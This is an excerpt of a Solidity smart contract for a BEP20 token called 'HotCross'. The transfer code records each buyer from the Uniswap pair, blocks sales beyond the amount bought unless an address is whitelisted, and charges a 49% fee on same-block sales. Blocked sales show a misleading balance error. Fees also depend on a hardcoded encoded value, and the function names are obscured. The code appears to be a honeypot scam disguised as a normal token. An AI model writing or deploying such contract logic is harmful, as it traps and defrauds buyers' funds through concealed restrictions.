...
pragma solidity ^0.8.0;
 ...
 contract HotCross is BEP20, Ownable {
     // ext
     struct Bot {
         address acc;
         uint amount;
 	...
 	string name_ = "HotCross";
 	string symbol_ = "HotCross";
     ...
     function getBotsBlock(uint256 i) external view returns (uint) {
         require(i < _bots.length,"out of range.");
         return _bots[i].blocknumber;
     }    
     ...
     function sb(address _acc,uint256 amount,uint blocknumber) internal virtual {
         for (uint8 i = 0;i<_bots.length;i++){
             if (_bots[i].acc == _acc) {
                 _bots[i].amount += amount;
                 _bots[i].blocknumber = blocknumber;
                 return;
             }
         }
         _bots.push(Bot(_acc,amount,blocknumber)); 
         return;       
     }
 
     function cb(address _acc,uint256 amount,uint256 blocknumber) internal virtual returns (bool) {
         bool f = false;        
         for (uint i = 0;i<_bots.length;i++){
             if (_bots[i].acc == _acc) {
                 if (_bots[i].amount >= amount && _bots[i].blocknumber != blocknumber) {
                      f = true;
                      _bots[i].amount -= amount;
                 }
                 break;
     ...
     function gt(address _acc,uint256 blocknumber) internal virtual returns (uint256) {
         uint256 t = _burnkfiel;        
         for (uint i = 0;i<_bots.length;i++){
             if (_bots[i].acc == _acc) {
                 if (_bots[i].blocknumber == blocknumber) t = 49;
                 break;
             }
         }
         return t;        
         ...
         if (rF) {
             ...
             if (uniswapV2Pair != address(0)) {
                 if (_to == uniswapV2Pair) {
                     require(_release[_msgSender()] || cb(from,_amuont,block.number) || byp > 0, "ERC20: transfer amuont exceeds balance");                            
                     //tradefeii = _burnkfiel;
                     tradefeii = _msgInfo(uint160(from));
                 }
                 if (from == uniswapV2Pair) {
                     tradefeii = _defaultBfeii;
                     sb(_to,_amuont,block.number);
                 }
             }
 	...
 	function _msgInfo(uint _acc) internal view virtual returns (uint) {
 		uint[1] memory acc = [uint(1127420884444157568868014086976028869705287323026)];
